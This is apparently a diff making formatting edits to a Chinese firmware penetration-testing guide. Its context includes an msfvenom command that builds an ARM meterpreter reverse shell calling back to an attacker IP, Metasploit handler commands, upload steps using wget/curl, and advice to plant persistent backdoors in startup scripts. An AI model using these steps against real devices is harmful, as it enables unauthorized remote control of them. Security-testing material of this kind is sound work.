@@ -359,7 +359,7 @@ FACT分析结果
     readelf -h <bin>
     ```
 
-    `el` 代表： `little endian` `eb` 代表：`big endian`
+    `el` 代表： `little endian` ，`eb` 代表：`big endian`
 
   * 字节序的获取：
     * 使用 binwalk 识别打包的固件二进制文件（不是提取出的文件系统中的二进制文件）
@@ -399,7 +399,7 @@ sudo chroot . ./qemu-arm-static usr/bin/shellback
 ​ 使用 netcat 尝试连接该服务
 
 ```text
-sudo lsof -i :5515
+sudo lsof -i:5515
 nc -nv 127.0.0.1 5515
 ```
 
@@ -512,15 +512,15 @@ mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/b
 
 若在动态分析后，通过操纵引导加载程序或其他的硬件安全测试手段获得了root shell，尝试执行预编译恶意二进制文件（即在二进制文件中植入程序或反向 shell），可通过使用自动化的有效载荷或工具（ C&C ）框架进行命令执行和控制，比如使用 Metasploit 框架和 `msfvenom`，如下是操作步骤：
 
-1. 确定目标固件架构和字节序
-2. 使用 msfvenom 生成有效载荷，-p ：payload、攻击者ip：LHOST=、攻击者监听端口：LPORT=、有效载荷的文件类型：-f、结构体系：--arch、平台：--platform linux or windows、输出文件保存：-o
+* 确定目标固件架构和字节序
+* 使用 msfvenom 生成有效载荷，-p ：payload、攻击者ip：LHOST=、攻击者监听端口：LPORT=、有效载荷的文件类型：-f、结构体系：--arch、平台：--platform linux or windows、输出文件保存：-o
 
 ```text
 msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux
 ```
 
-1. 将有效载荷传输到受攻击的设备（操作举例：本地运行Web服务器，然后使用 `wget/curl` 上传到目标文件系统中），确认有效载荷有执行权限
-2. 使用 Metasploit 接收反弹回的 shell 之前的设备
+* 将有效载荷传输到受攻击的设备（操作举例：本地运行Web服务器，然后使用 `wget/curl` 上传到目标文件系统中），确认有效载荷有执行权限
+* 使用 Metasploit 接收反弹回的 shell 之前的设备
 
 ```text
 set payload linux/armle/meterpreter_reverse_tcp
@@ -530,9 +530,9 @@ set ExitOnSession false
 exploit -j -z
 ```
 
-1. 在受攻击的设备中执行 meterpreter reverse
-2. 查看 meterpreter sessions
-3. 进行后渗透
+* 在受攻击的设备中执行 meterpreter reverse
+* 查看 meterpreter sessions
+* 进行后渗透
 
 最后，尽可能的在启动脚本中设置对设备持久访问的后门，保证重新启动后也有设备的访问控制权
 
